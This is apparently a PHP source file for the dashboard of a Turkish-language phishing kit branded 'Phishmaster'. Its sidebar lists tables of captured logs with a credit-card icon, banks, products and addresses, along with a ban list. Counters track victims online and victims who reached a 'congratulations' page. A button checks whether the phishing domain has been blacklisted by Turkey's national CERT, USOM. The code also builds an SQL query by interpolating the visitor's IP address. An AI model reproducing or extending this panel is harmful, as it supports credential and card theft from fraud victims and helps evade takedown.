<?php

include_once(__DIR__ . "/../config.php");
include_once(__DIR__ . "/Data/Server/GrabIP.php");
include_once(__DIR__ . "/function/MainFunction.php");
giris_dogrulama($pdo);

$QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
$QueryAdmin = $pdo->query("SELECT * FROM admin WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
?>
<!doctype html>
<html lang="tr">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>monke - Anasayfa</title>
  <meta name="description" content="monke Panel">
  <meta name="author" content="monke">
  <meta name="robots" content="noindex, nofollow">

  <meta property="og:title" content="monke Panel">
  <meta property="og:site_name" content="Developed monke">
  <meta property="og:description" content="monke Panel">
  <meta property="og:type" content="website">

  <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
  <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
  <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
  <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

  <script>
    $(document).ready(function() {
      setInterval(function() {
        $("#Cevrimici").load(window.location.href + " #Cevrimici");
      }, 3000);

      setInterval(function() {
        $("#Ban").load(window.location.href + " #Ban");
      }, 3000);

      setInterval(function() {
        $("#Log").load(window.location.href + " #Log");
      }, 3000);

      setInterval(function() {
        $("#Tebriklenen").load(window.location.href + " #Tebriklenen");
      }, 3000);
    });
  </script>
</head>

<body>
  <div id="page-container" class="sidebar-o sidebar-light enable-page-overlay side-scroll page-header-fixed remember-theme">
    <nav id="sidebar" aria-label="Main Navigation">
      <div class="content-header">
        <a class="fw-semibold text-dual" href="main">
          <span class="smini-visible">
            <i class="fa-solid fa-crosshairs text-primary"></i>
          </span>
          <span class="smini-hide fs-5 tracking-wider">Phish<span class="fw-normal">master</span></span>
        </a>
        <div>
          <button type="button" class="btn btn-sm btn-alt-secondary" data-toggle="layout" data-action="dark_mode_toggle">
            <i class="fa fa-moon"></i>
          </button>
          <div class="dropdown d-inline-block ms-1">
            <button type="button" class="btn btn-sm btn-alt-secondary" id="sidebar-themes-dropdown" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-haspopup="true" aria-expanded="false">
              <i class="fa fa-brush"></i>
            </button>
            <div class="dropdown-menu dropdown-menu-end fs-sm smini-hide border-0" aria-labelledby="sidebar-themes-dropdown">
              <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="default">
                <span>Varsayılan</span>
                <i class="fa fa-circle text-default"></i>
              </button>
              <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/amethyst.min.css">
                <span>Stil 1</span>
                <i class="fa fa-circle text-amethyst"></i>
              </button>
              <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/city.min.css">
                <span>Stil 2</span>
                <i class="fa fa-circle text-city"></i>
              </button>
              <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/flat.min.css">
                <span>Stil 3</span>
                <i class="fa fa-circle text-flat"></i>
              </button>
              <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/modern.min.css">
                <span>Stil 4</span>
                <i class="fa fa-circle text-modern"></i>
              </button>
              <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/smooth.min.css">
                <span>Stil 5</span>
                <i class="fa fa-circle text-smooth"></i>
              </button>
            </div>
          </div>
          <a class="d-lg-none btn btn-sm btn-alt-secondary ms-1" data-toggle="layout" data-action="sidebar_close" href="javascript:void(0)">
            <i class="fa fa-fw fa-times"></i>
          </a>
        </div>
      </div>
      <div class="js-sidebar-scroll">
        <div class="content-side">
          <ul class="nav-main">
            <li class="nav-main-item">
              <a class="nav-main-link active" href="main">
                <i class="nav-main-link-icon si si-speedometer"></i>
                <span class="nav-main-link-name">Anasayfa</span>
              </a>
            </li>
            <li class="nav-main-heading">PHISHING</li>
            <li class="nav-main-item">
              <a class="nav-main-link" href="logs">
                <i class="nav-main-link-icon si si-credit-card"></i>
                <span class="nav-main-link-name">Log Tablosu</span>
              </a>
            </li>
            <li class="nav-main-item">
              <a class="nav-main-link" href="bans">
                <i class="nav-main-link-icon si si-ban"></i>
                <span class="nav-main-link-name">Ban Tablosu</span>
              </a>
            </li>
            <li class="nav-main-item">
              <a class="nav-main-link" href="banks">
                <i class="nav-main-link-icon fa fa-bank"></i>
                <span class="nav-main-link-name">Banka Tablosu</span>
              </a>
            </li>
            <li class="nav-main-item">
              <a class="nav-main-link" href="urunler">
                <i class="nav-main-link-icon fa fa-cart-shopping"></i>
                <span class="nav-main-link-name">Ürün Tablosu</span>
              </a>
            </li>
            <li class="nav-main-item">
              <a class="nav-main-link" href="address">
                <i class="nav-main-link-icon fa fa-map"></i>
                <span class="nav-main-link-name">Adres Tablosu</span>
              </a>
            </li>
            <li class="nav-main-heading">ARACLAR</li>
            <li class="nav-main-item">
              <a class="nav-main-link" href="javascript:void(0);" id="check_usom">
                <i class="nav-main-link-icon fa fa-check-double"></i>
                <span class="nav-main-link-name">USOM Kontrolü</span>
              </a>
            </li>
            <?php if ($QueryAdmin['yetki'] == "Superadmin"): ?>
              <li class="nav-main-heading">YONETIM</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="user">
                  <i class="nav-main-link-icon si si-people"></i>
                  <span class="nav-main-link-name">Kullanıcı Yönetimi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="action_history">
                  <i class="nav-main-link-icon si si-list"></i>
                  <span class="nav-main-link-name">İşlem Geçmişi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="factory_reset">
                  <i class="nav-main-link-icon fa-solid fa-wrench"></i>
                  <span class="nav-main-link-name">Fabrika Ayarları</span>
                </a>
              </li>
            <?php endif; ?>
          </ul>
        </div>
      </div>
    </nav>
    <header id="page-header">
      <div class="content-header">
        <div class="d-flex align-items-center">
          <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-lg-none" data-toggle="layout" data-action="sidebar_toggle">
            <i class="fa fa-fw fa-bars"></i>
          </button>
          <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-none d-lg-inline-block" data-toggle="layout" data-action="sidebar_mini_toggle">
            <i class="fa fa-fw fa-ellipsis-v"></i>
          </button>
        </div>
        <div class="d-flex align-items-center">
          <div class="dropdown d-inline-block ms-2">
            <button type="button" class="btn btn-sm btn-alt-secondary d-flex align-items-center" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <img class="rounded-circle" src="assets/media/avatars/avatar0.jpg" style="width: 21px;">
              <span class="d-none d-sm-inline-block ms-2"><?php echo $QueryAdmin['kullanici_adi']; ?></span>
              <i class="fa fa-fw fa-angle-down d-none d-sm-inline-block opacity-50 ms-1 mt-1"></i>
            </button>
            <div class="dropdown-menu dropdown-menu-md dropdown-menu-end p-0 border-0" aria-labelledby="page-header-user-dropdown">
              <div class="p-3 text-center bg-body-light border-bottom rounded-top">
                <p class="mt-2 mb-0 fw-medium"><?php echo $QueryAdmin['kullanici_adi']; ?></p>
                <p class="mb-0 text-muted fs-sm fw-medium"><?php echo $QueryAdmin['yetki']; ?></p>
              </div>
              <div class="p-2">
                <a class="dropdown-item d-flex align-items-center justify-content-between" href="settings">
                  <span class="fs-sm fw-medium">Ayarlar</span>
                </a>
                <a class="dropdown-item d-flex align-items-center justify-content-between" href="quit">
                  <span class="fs-sm fw-medium">Çıkış Yap</span>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>
    <main id="main-container">
      <div class="bg-body-light">
        <div class="content content-full">
          <div class="d-flex flex-column flex-sm-row justify-content-sm-between align-items-sm-center py-2">
            <div class="flex-grow-1">
              <h1 class="h3 fw-bold mb-2"> Anasayfa </h1>
              <h2 class="fs-base lh-base fw-medium text-muted mb-0">
                <?php echo $mesaj; ?> <a class="link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>, bu sayfa sayesinde panelin istatistiklerini görebilirsin.
              </h2>
            </div>
            <nav class="flex-shrink-0 mt-3 mt-sm-0 ms-sm-3" aria-label="breadcrumb">
              <ol class="breadcrumb breadcrumb-alt">
                <li class="breadcrumb-item" aria-current="page"> Anasayfa </li>
              </ol>
            </nav>
          </div>
        </div>
      </div>
      <div class="content">
        <div class="row items-push">
          <div class="col-sm-6 col-xxl-3">
            <div class="block block-rounded d-flex flex-column h-100 mb-0">
              <div class="block-content block-content-full flex-grow-1 d-flex justify-content-between align-items-center">
                <dl class="mb-0">
                  <dt class="fs-3 fw-bold" id="Log"><?php echo $log_sayisi; ?></dt>
                  <dd class="fs-sm fw-medium fs-sm fw-medium text-muted mb-0">Log Sayısı</dd>
                </dl>
                <div class="item item-rounded-lg bg-body-light">
                  <i class="far fa-credit-card fs-3 text-primary"></i>
                </div>
              </div>
              <div class="bg-body-light rounded-bottom">
                <a class="block-content block-content-full block-content-sm fs-sm fw-medium d-flex align-items-center justify-content-between" href="logs">
                  <span>Log Tablosuna Git</span>
                  <i class="fa fa-arrow-alt-circle-right ms-1 opacity-25 fs-base"></i>
                </a>
              </div>
            </div>
          </div>
          <div class="col-sm-6 col-xxl-3">
            <div class="block block-rounded d-flex flex-column h-100 mb-0">
              <div class="block-content block-content-full flex-grow-1 d-flex justify-content-between align-items-center">
                <dl class="mb-0">
                  <dt class="fs-3 fw-bold" id="Ban"><?php echo $ban_sayisi; ?></dt>
                  <dd class="fs-sm fw-medium fs-sm fw-medium text-muted mb-0">Ban Sayısı</dd>
                </dl>
                <div class="item item-rounded-lg bg-body-light">
                  <i class="far fa-circle-xmark fs-3 text-primary"></i>
                </div>
              </div>
              <div class="bg-body-light rounded-bottom">
                <a class="block-content block-content-full block-content-sm fs-sm fw-medium d-flex align-items-center justify-content-between" href="bans">
                  <span>Ban Tablosuna Git</span>
                  <i class="fa fa-arrow-alt-circle-right ms-1 opacity-25 fs-base"></i>
                </a>
              </div>
            </div>
          </div>
          <div class="col-sm-6 col-xxl-3">
            <div class="block block-rounded d-flex flex-column h-100 mb-0">
              <div class="block-content block-content-full flex-grow-1 d-flex justify-content-between align-items-center">
                <dl class="mb-0">
                  <dt class="fs-3 fw-bold" id="Cevrimici"><?php $onlineList = [];
                                                          $query = $pdo->query("SELECT * FROM cevrimici_tablosu", PDO::FETCH_ASSOC);
                                                          if ($query->rowCount()) {
                                                            foreach ($query as $v) {
                                                              if ($v['onlineTimer'] > time()) {
                                                                array_push($onlineList, $v['ip']);
                                                              }
                                                            }
                                                          }
                                                          echo count($onlineList); ?></dt>
                  <dd class="fs-sm fw-medium fs-sm fw-medium text-muted mb-0">Çevrimiçi Sayısı</dd>
                </dl>
                <div class="item item-rounded-lg bg-body-light">
                  <i class="fa fa-wifi fs-3 text-primary"></i>
                </div>
              </div>
              <div class="bg-body-light rounded-bottom">
                <a class="block-content block-content-full block-content-sm fs-sm fw-medium d-flex align-items-center justify-content-between" href="logs">
                  <span>Log Tablosuna Git</span>
                  <i class="fa fa-arrow-alt-circle-right ms-1 opacity-25 fs-base"></i>
                </a>
              </div>
            </div>
          </div>
          <div class="col-sm-6 col-xxl-3">
            <div class="block block-rounded d-flex flex-column h-100 mb-0">
              <div class="block-content block-content-full flex-grow-1 d-flex justify-content-between align-items-center">
                <dl class="mb-0">
                  <dt class="fs-3 fw-bold" id="Tebriklenen"><?php $tebrikList = [];
                                                            $query = $pdo->query("SELECT * FROM logs", PDO::FETCH_ASSOC);
                                                            if ($query->rowCount()) {
                                                              foreach ($query as $v) {
                                                                if ($v['durum'] === 'Tebrikler Sayfası') {
                                                                  array_push($tebrikList, $v['durum']);
                                                                }
                                                              }
                                                            }
                                                            echo count($tebrikList); ?></dt>
                  <dd class="fs-sm fw-medium fs-sm fw-medium text-muted mb-0">Tebriklenen Sayısı</dd>
                </dl>
                <div class="item item-rounded-lg bg-body-light">
                  <i class="fa fa-circle-check fs-3 text-primary"></i>
                </div>
              </div>
              <div class="bg-body-light rounded-bottom">
                <a class="block-content block-content-full block-content-sm fs-sm fw-medium d-flex align-items-center justify-content-between" href="logs">
                  <span>Log Tablosuna Git</span>
                  <i class="fa fa-arrow-alt-circle-right ms-1 opacity-25 fs-base"></i>
                </a>
              </div>
            </div>
          </div>

        </div>
      </div>
    </main>
    <footer id="page-footer" class="bg-body-light">
      <div class="content py-3">
        <div class="row fs-sm">
          <div class="col-sm-6 order-sm-2 py-1 text-center text-sm-end"> Kullanıcı: <a class="fw-semibold link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>
          </div>
          <div class="col-sm-6 order-sm-1 py-1 text-center text-sm-start">
            <a class="fw-semibold link-fx" href="javascript:void(0)">monke</a> &copy; <span data-toggle="year-copy"></span>
          </div>
        </div>
      </div>
    </footer>
  </div>
  <script type="text/javascript">
    document.getElementById("check_usom").addEventListener("click", function(e) {
      var domain = window.location.host;

      One.helpers('jq-notify', {
        type: 'warning',
        icon: 'fa fa-rotate me-1',
        message: 'USOM kontrolü yapılıyor!'
      });

      e.preventDefault();

      $.ajax({
        type: "POST",
        url: "./function/CheckUsom.php",
        data: {
          domain: domain
        },
        success: function(data) {
          if (data === "yasaklandi") {
            One.helpers('jq-notify', {
              type: 'danger',
              icon: 'fa fa-times me-1',
              message: "Domain USOM tarafından yasaklanmış durumda."
            });
          } else if (data === "yasaklanmadi") {
            One.helpers('jq-notify', {
              type: 'success',
              icon: 'fa fa-check me-1',
              message: "Domain USOM tarafından yasaklanmadı."
            });
          } else if (data === "baglanti hatasi") {
            One.helpers('jq-notify', {
              type: 'danger',
              icon: 'fa fa-check me-1',
              message: "USOM ile bağlantı kurulamadı!"
            });
          }
        }
      });
    });
    var title = document.title;
    var alttitle = "Vurgun için bekleniyorsun ;)";
    window.onblur = function() {
      document.title = alttitle;
    };
    window.onfocus = function() {
      document.title = title;
    };

    document.getElementById("factory_reset").addEventListener("click", function(e) {
      Swal.fire({
        title: 'Emin misin?',
        text: "Bu işlemi geri alamıyacaksın ve bütün veriler silinecektir!",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#3085d6',
        cancelButtonColor: '#d33',
        confirmButtonText: 'Evet',
        cancelButtonText: 'Hayır'
      }).then((result) => {
        if (result.isConfirmed) {
          e.preventDefault();
          $.ajax({
            type: "POST",
            url: "./function/FactoryReset.php",
            data: {
              izin: true
            },
            success: function(data) {
              Swal.fire({
                title: 'İşlem Başarılı!',
                text: "Bütün veriler başarıyla silindi.",
                icon: 'success',
                confirmButtonColor: '#3085d6',
                confirmButtonText: 'Tamam'
              }).then((result) => {
                if (result.isConfirmed) {
                  window.location.href = 'quit';
                }
              })
            }
          });
        }
      })
    });
  </script>
  <script src="assets/js/oneui.app.min.js"></script>
  <script src="assets/js/lib/jquery.min.js"></script>
  <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script>
    One.helpersOnLoad(['jq-notify']);
  </script>
</body>

</html>